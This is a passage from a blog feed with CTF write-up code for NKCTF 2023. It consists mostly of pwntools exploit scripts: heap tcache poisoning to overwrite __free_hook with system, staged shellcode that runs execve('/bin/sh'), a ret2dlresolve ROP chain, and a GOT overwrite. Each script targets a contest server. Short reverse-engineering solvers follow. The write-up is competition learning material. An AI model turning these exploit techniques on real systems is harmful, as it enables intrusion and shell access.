class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content: &#x27;</span>,data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;32973&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x88</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    free(i)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x48</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">7</span>)<br><br>pause()<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&amp;<span class="hljs-number">0xffffffffffffff00</span><br>main_area=d-<span class="hljs-number">0x60</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=main_area-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">6</span>-i,<span class="hljs-number">0x88</span>)<br>show(<span class="hljs-number">1</span>)<br><br>heap_1_c=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap=calc_fd(heap_1_c,<span class="hljs-number">0x2a0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>pause()<br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x91</span>)+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,pad)<br>edit(<span class="hljs-number">2</span>,pad)<br>edit(<span class="hljs-number">3</span>,pad)<br><br>pad1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">b&#x27;\xf1&#x27;</span><br>edit(<span class="hljs-number">0</span>,pad1)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+p64(<span class="hljs-number">0x91</span>)+p64(enc_fd(heap+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x10</span>,free_hook))+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,payload)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\n&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-number">3</span>,p64(system)+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="9961code"><a href="#9961code" class="headerlink" title="9961code"></a>9961code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>sh=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">and esi,edi</span><br><span class="hljs-string">mov dx,0xf</span><br><span class="hljs-string">add eax,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov esi,edi</span><br><span class="hljs-string">xor edi,edi</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh1=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add edx,0x30</span><br><span class="hljs-string">mov ax,0</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh2=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov edi,0x9961020</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov ax,0x3b</span><br><span class="hljs-string">    syscall&quot;&quot;&quot;</span><br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(sh)))<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:32041&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp main+294&#x27;)</span><br><span class="hljs-comment">#p=remote(&quot;node2.yuzhian.com.cn:30693&quot;)</span><br>pause()<br>p.sendafter(<span class="hljs-string">&#x27;shellcode&#x27;</span>,asm(sh))<br>pause()<br>p.sendline(asm(sh1))<br>pause()<br>p.sendline(asm(sh2).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>read=<span class="hljs-number">0x4013d0</span><br>leave=<span class="hljs-number">0x4013e7</span><br>ret=<span class="hljs-number">0x4013e8</span><br><span class="hljs-keyword">from</span> mcrypt <span class="hljs-keyword">import</span> *<br><br><br>c=[<span class="hljs-string">b&quot;Welcome to NKCTF!\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;tell you a secret:\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;can you find me?\x00&quot;</span>]<br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:31146&quot;</span>)<br>base=b64()<br>base.setbase(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-built_in">print</span>(i)<br>    p.sendline(base.encode(i))<br>    pause()<br><br>rel=<span class="hljs-number">0x4005d8</span><br><span class="hljs-comment">#str_t=0x3ff388</span><br><span class="hljs-comment">#sym=0x3ff420</span><br>sym=<span class="hljs-number">0x4003d0</span><br>str_t=<span class="hljs-number">0x4004c0</span><br>bss=<span class="hljs-number">0x404900</span>+<span class="hljs-number">0xc0</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>sym_ind=<span class="hljs-number">905</span><br>func_got=e.got[<span class="hljs-string">&#x27;memset&#x27;</span>]<br><br>rdi=<span class="hljs-number">0x00401683</span><br>rel_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span>+<span class="hljs-number">0x18</span><br>sym_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add))<br><br>gogo=<span class="hljs-number">0x401039</span><br><span class="hljs-comment">#p.interactive()</span><br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span><br>pad_n=<span class="hljs-number">3</span><br>bin_sh=bss<br>system=bss+<span class="hljs-number">0x28</span><br>str_=<span class="hljs-string">b&#x27;/bin/sh\x00\x00system\x00&#x27;</span><br>sym_=p32(system-str_t)+p64(<span class="hljs-number">12</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>rel_=p64(bss-<span class="hljs-number">0x30</span>)+p32(<span class="hljs-number">7</span>)+p32((sym_add-sym)//<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401039&#x27;)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add-rel))<br><br><br><br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>payload2+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(rdi)+p64(bin_sh)+p64(gogo)+p64((rel_add-rel)//<span class="hljs-number">0x18</span>+<span class="hljs-number">1</span>)<br>payload2+=<span class="hljs-string">b&quot;system\x00\x00&quot;</span><br>payload2+=sym_+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+rel_<br><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(read)<br>p.sendline(payload)<br>pause()<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&quot; &quot;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><br><br>e=ELF(<span class="hljs-string">&#x27;./nk_note&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:30946&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./nk_note&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>show(<span class="hljs-number">16</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>pause()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x300</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">16</span>,payload)<br>show(<span class="hljs-number">16</span>)<br>p.readuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>d1=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d1))<br>e.address=d1-<span class="hljs-number">0x4120</span><br><br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br><br><br>l=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x6B</span>):<br>    payload=<span class="hljs-string">&#x27;a&#x27;</span>*i*<span class="hljs-number">8</span><br>    edit(<span class="hljs-number">16</span>,payload)<br>    show(<span class="hljs-number">16</span>)<br>    data=p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).strip(<span class="hljs-string">b&#x27;a&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    dn=u64(data)<br>    l.append(dn)<br><br><span class="hljs-built_in">print</span>(l)<br>pause()<br>payload=flat(l)+p64(e.address+<span class="hljs-number">0x4150</span>)<br>edit(<span class="hljs-number">16</span>,payload)<br>ind=<span class="hljs-number">0x26</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x40</span>)<br><br>edit(<span class="hljs-number">5</span>,p64(func_got))<br>show(ind)<br>dd=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dd))<br>libc.address=dd-libc.sym[func]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">5</span>,p64(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(ind,p64(system))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ez-baby-apk"><a href="#ez-baby-apk" class="headerlink" title="ez_baby_apk"></a>ez_baby_apk</h2><p>使用jadx加雷电模拟器进行调试</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-2.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/ez_baby_apk-3.png"></p><h2 id="PMKF"><a href="#PMKF" class="headerlink" title="PMKF"></a>PMKF</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/PMKF-1.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-string">&quot;1122&quot;</span>,<span class="hljs-string">&quot;3322&quot;</span>,<span class="hljs-string">&quot;1223&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;1101&quot;</span>,<span class="hljs-string">&quot;0000&quot;</span>,<span class="hljs-string">&quot;0101&quot;</span>,<span class="hljs-string">&quot;1211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;2223&quot;</span>,<span class="hljs-string">&quot;2330&quot;</span>,<span class="hljs-string">&quot;3323&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;1112&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>]<br>e=[]<br>k=<span class="hljs-string">b&#x27;nkman&#x27;</span><br>k1=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> k:<br>    k1+=i<br>k1=k1&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(k1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>        c+=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)<br>    e.append(<span class="hljs-built_in">int</span>(c,<span class="hljs-number">2</span>)^k1)<br><span class="hljs-built_in">print</span>((<span class="hljs-string">b&#x27;\x05&#x27;</span>+<span class="hljs-string">b&#x27;nkman&#x27;</span>+<span class="hljs-built_in">bytes</span>(e)).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h2 id="babyrust"><a href="#babyrust" class="headerlink" title="babyrust"></a>babyrust</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/babyrust-1.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&quot;)&amp;n_qFb&#x27;NZXpj)*bLDmLnVj]@^_H&quot;</span><br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    d=(i-<span class="hljs-number">0x28</span>+<span class="hljs-number">45</span>)^<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">if</span> d&lt;<span class="hljs-number">0x20</span>:<br>        d=d+<span class="hljs-number">48</span><br>    e.append(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;rank：15&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="nkctf" scheme="https://www.lewiserii.top/tags/nkctf/"/>
    
  </entry>
  
  <entry>
    <title>auto_deploy.sh</title>
    <link href="https://www.lewiserii.top/%E5%85%B6%E4%BB%96/auto_deploy.html"/>
    <id>https://www.lewiserii.top/%E5%85%B6%E4%BB%96/auto_deploy.html</id>
    <published>2023-02-24T16:30:00.000Z</published>
    <updated>2023-02-28T06:23:27.281Z</updated>
    
